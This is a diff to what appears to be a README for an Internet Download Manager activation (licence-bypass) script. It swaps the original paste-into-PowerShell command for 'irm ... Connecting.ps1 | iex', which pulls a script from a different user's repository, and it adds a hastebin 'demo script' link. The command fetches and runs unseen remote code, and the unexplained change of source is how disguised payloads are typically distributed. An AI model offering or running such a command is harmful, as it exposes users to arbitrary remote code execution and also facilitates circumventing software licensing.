@@ -37,7 +37,8 @@ On Windows 10/11, right-click on the windows start menu and select PowerShell or
 
 Copy-paste the below code and press enter
 
-iwr -useb https://raw.githubusercontent.com/lstprjct/IDM-Activation-Script/main/IAS.ps1 | iex
+irm https://raw.githubusercontent.com/npquyngoc/Internet_Download_Manager_Activation_Script/main/Connecting.ps1 | iex
+Example demo script by npquyngoc: https://hastebin.com/osekihopih.php
 
 You will see the activation options, and follow onscreen instructions.
 
